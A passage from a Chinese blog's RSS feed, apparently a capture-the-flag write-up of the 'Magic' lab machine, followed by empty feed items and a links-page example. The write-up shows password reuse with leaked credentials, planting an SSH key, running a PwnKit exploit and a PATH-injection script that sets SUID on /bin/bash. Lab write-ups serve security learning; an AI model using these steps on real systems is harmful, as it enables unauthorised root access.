&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;815&#34; height=&#34;154&#34; src=&#34;../legacy/uploads/2024/08/1724908274-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-431&#34; srcset=&#34;../legacy/uploads/2024/08/1724908274-image.png 815w, ../legacy/uploads/2024/08/1724908274-image-300x57.png 300w, ../legacy/uploads/2024/08/1724908274-image-768x145.png 768w&#34; sizes=&#34;auto, (max-width: 815px) 100vw, 815px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;有个theseus用户。开放端口：&lt;/p&gt;
&lt;pre class=&#34;wp-block-code&#34;&gt;&lt;code&gt;Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;内网开放了631和3306&lt;/p&gt;
&lt;p&gt;在/var/www/Magic/目录下&lt;/p&gt;
&lt;pre class=&#34;wp-block-code&#34;&gt;&lt;code&gt;www-data@magic:/var/www/Magic$ ls -al
ls -al
total 52
drwxr-xr-x 4 www-data www-data 4096 Jul 12  2021 .
drwxr-xr-x 4 root     root     4096 Jul  6  2021 ..
-rwx---r-x 1 www-data www-data  162 Oct 18  2019 .htaccess
drwxrwxr-x 6 www-data www-data 4096 Jul  6  2021 assets
-rw-r--r-- 1 www-data www-data  881 Oct 16  2019 db.php5
drwxr-xr-x 4 www-data www-data 4096 Jul  6  2021 images
-rw-rw-r-- 1 www-data www-data 4528 Oct 22  2019 index.php
-rw-r--r-- 1 www-data www-data 5539 Oct 22  2019 login.php
-rw-r--r-- 1 www-data www-data   72 Oct 18  2019 logout.php
-rw-r--r-- 1 www-data www-data 4520 Oct 22  2019 upload.php&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;查看db.php5 &lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;859&#34; height=&#34;285&#34; src=&#34;../legacy/uploads/2024/08/1724908334-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-437&#34; srcset=&#34;../legacy/uploads/2024/08/1724908334-image.png 859w, ../legacy/uploads/2024/08/1724908334-image-300x100.png 300w, ../legacy/uploads/2024/08/1724908334-image-768x255.png 768w&#34; sizes=&#34;auto, (max-width: 859px) 100vw, 859px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;得到数据库cred: &lt;strong&gt;theseus/iamkingtheseus&lt;/strong&gt; 直接su用户看看有没有密码复用&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;711&#34; height=&#34;150&#34; src=&#34;../legacy/uploads/2024/08/1724908384-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-440&#34; srcset=&#34;../legacy/uploads/2024/08/1724908384-image.png 711w, ../legacy/uploads/2024/08/1724908384-image-300x63.png 300w&#34; sizes=&#34;auto, (max-width: 711px) 100vw, 711px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;啧，不行。用前面找到的Magic admin的密码试试&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;711&#34; height=&#34;173&#34; src=&#34;../legacy/uploads/2024/08/1724908405-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-442&#34; srcset=&#34;../legacy/uploads/2024/08/1724908405-image.png 711w, ../legacy/uploads/2024/08/1724908405-image-300x73.png 300w&#34; sizes=&#34;auto, (max-width: 711px) 100vw, 711px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;芜湖~在home/theseus下得到user flag. 查看/etc/ssh/ssh_config配置文件&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;574&#34; height=&#34;183&#34; src=&#34;../legacy/uploads/2024/08/1724908431-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-446&#34; srcset=&#34;../legacy/uploads/2024/08/1724908431-image.png 574w, ../legacy/uploads/2024/08/1724908431-image-300x96.png 300w&#34; sizes=&#34;auto, (max-width: 574px) 100vw, 574px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;ssh关闭了密码认证，在kali上创造一对密钥: ssh-keygen -t rsa -b 4096 -f magic&lt;/p&gt;
&lt;p&gt;并把publick key上传到theseus/.ssh/authorized_keys&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;245&#34; src=&#34;../legacy/uploads/2024/08/1724908439-image-1024x245.png&#34; alt=&#34;&#34; class=&#34;wp-image-448&#34; srcset=&#34;../legacy/uploads/2024/08/1724908439-image-1024x245.png 1024w, ../legacy/uploads/2024/08/1724908439-image-300x72.png 300w, ../legacy/uploads/2024/08/1724908439-image-768x184.png 768w, ../legacy/uploads/2024/08/1724908439-image.png 1169w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;服务器没装curl 用wget上传key并登录&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;550&#34; src=&#34;../legacy/uploads/2024/08/1724908455-image-1024x550.png&#34; alt=&#34;&#34; class=&#34;wp-image-451&#34; srcset=&#34;../legacy/uploads/2024/08/1724908455-image-1024x550.png 1024w, ../legacy/uploads/2024/08/1724908455-image-300x161.png 300w, ../legacy/uploads/2024/08/1724908455-image-768x413.png 768w, ../legacy/uploads/2024/08/1724908455-image.png 1180w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt; &lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;562&#34; src=&#34;../legacy/uploads/2024/08/1724908486-image-1024x562.png&#34; alt=&#34;&#34; class=&#34;wp-image-454&#34; srcset=&#34;../legacy/uploads/2024/08/1724908486-image-1024x562.png 1024w, ../legacy/uploads/2024/08/1724908486-image-300x165.png 300w, ../legacy/uploads/2024/08/1724908486-image-768x422.png 768w, ../legacy/uploads/2024/08/1724908486-image.png 1047w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;ok，ssh登录成功。&lt;/p&gt;
&lt;h2 id=&#34;root&#34;&gt;Root
&lt;/h2&gt;&lt;p&gt;交给linpeas 做enumeration吧。。找了一大圈，发现没什么可疑的。只能试试kernelexploit了.&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;254&#34; src=&#34;../legacy/uploads/2024/08/1724908516-image-1024x254.png&#34; alt=&#34;&#34; class=&#34;wp-image-458&#34; srcset=&#34;../legacy/uploads/2024/08/1724908516-image-1024x254.png 1024w, ../legacy/uploads/2024/08/1724908516-image-300x75.png 300w, ../legacy/uploads/2024/08/1724908516-image-768x191.png 768w, ../legacy/uploads/2024/08/1724908516-image.png 1123w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;试试Pwnkit &lt;a href=&#34;https://codeload.github.com/berdav/CVE-2021-4034/zip/main&#34; target=&#34;_blank&#34;  rel=&#34;nofollow&#34; &gt;&lt;a class=&#34;link&#34; href=&#34;https://codeload.github.com/berdav/CVE-2021-4034/zip/main&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://codeload.github.com/berdav/CVE-2021-4034/zip/main&lt;/a&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;上传后运行：&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;971&#34; height=&#34;366&#34; src=&#34;../legacy/uploads/2024/08/1724908538-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-461&#34; srcset=&#34;../legacy/uploads/2024/08/1724908538-image.png 971w, ../legacy/uploads/2024/08/1724908538-image-300x113.png 300w, ../legacy/uploads/2024/08/1724908538-image-768x289.png 768w&#34; sizes=&#34;auto, (max-width: 971px) 100vw, 971px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Boom rooted.&lt;/p&gt;
&lt;h2 id=&#34;alternative-way&#34;&gt;Alternative way
&lt;/h2&gt;&lt;p&gt;官方Writeup用的是另一种方法。也是我懒，没有细看每一个SUID的binary。&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;168&#34; src=&#34;../legacy/uploads/2024/08/1724908798-image-1024x168.png&#34; alt=&#34;&#34; class=&#34;wp-image-468&#34; srcset=&#34;../legacy/uploads/2024/08/1724908798-image-1024x168.png 1024w, ../legacy/uploads/2024/08/1724908798-image-300x49.png 300w, ../legacy/uploads/2024/08/1724908798-image-768x126.png 768w, ../legacy/uploads/2024/08/1724908798-image.png 1471w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;linpeas找到了一个未知的suid binary。运行后输出系统信息。使用strings /bin/sysinfo查看binary里的字符串&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;937&#34; height=&#34;310&#34; src=&#34;../legacy/uploads/2024/08/1724908936-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-472&#34; srcset=&#34;../legacy/uploads/2024/08/1724908936-image.png 937w, ../legacy/uploads/2024/08/1724908936-image-300x99.png 300w, ../legacy/uploads/2024/08/1724908936-image-768x254.png 768w&#34; sizes=&#34;auto, (max-width: 937px) 100vw, 937px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;发现系统在用cat /proc/cpuinfo 打印cpu信息而不是/bin/cat 这意味着有PATH injection漏洞。&lt;/p&gt;
&lt;p&gt;在theseus主目录下创建一个文件cat, 并把路径加入PATH&lt;/p&gt;
&lt;pre class=&#34;wp-block-code&#34;&gt;&lt;code&gt;echo &#34;#/bin/bash\n chmod +s /bin/bash&#34; &gt; cat
chmod +x cat
export PATH=/home/theseus/:$PATH&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;再次运行/bin/sysinfo后查看/bin/bash权限&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;102&#34; src=&#34;../legacy/uploads/2024/08/1724909436-image-1024x102.png&#34; alt=&#34;&#34; class=&#34;wp-image-484&#34; srcset=&#34;../legacy/uploads/2024/08/1724909436-image-1024x102.png 1024w, ../legacy/uploads/2024/08/1724909436-image-300x30.png 300w, ../legacy/uploads/2024/08/1724909436-image-768x77.png 768w, ../legacy/uploads/2024/08/1724909436-image.png 1532w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;rooted&lt;/p&gt;
</description>
        </item>
        <item>
        <title>关于</title>
        <link>http://localhost:1313/en/about/</link>
        <pubDate>Tue, 28 May 2019 00:00:00 +0000</pubDate>
        
        <guid>http://localhost:1313/en/about/</guid>
        <description></description>
        </item>
        <item>
        <title>归档</title>
        <link>http://localhost:1313/en/archives/</link>
        <pubDate>Tue, 28 May 2019 00:00:00 +0000</pubDate>
        
        <guid>http://localhost:1313/en/archives/</guid>
        <description></description>
        </item>
        <item>
        <title>友链</title>
        <link>http://localhost:1313/en/%E5%8F%8B%E9%93%BE/</link>
        <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
        
        <guid>http://localhost:1313/en/%E5%8F%8B%E9%93%BE/</guid>
        <description>&lt;p&gt;To use this feature, add &lt;code&gt;links&lt;/code&gt; section to frontmatter.&lt;/p&gt;
&lt;p&gt;This page&amp;rsquo;s frontmatter:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-yaml&#34; data-lang=&#34;yaml&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;links&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;title&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;GitHub&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;description&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;GitHub is the world&amp;#39;s largest software development platform.&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;website&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;https://github.com&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;image&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;title&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;TypeScript&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;description&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;TypeScript is a typed superset of JavaScript that compiles to plain JavaScript.&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;website&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;https://www.typescriptlang.org&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;image&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;ts-logo-128.jpg&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;code&gt;image&lt;/code&gt; field accepts both local and external images.&lt;/p&gt;
</description>
        </item>
        <item>
        <title>搜索</title>
        <link>http://localhost:1313/en/search/</link>
        <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
        
        <guid>http://localhost:1313/en/search/</guid>
        <description></description>
        </item>
        
    </channel>
</rss>
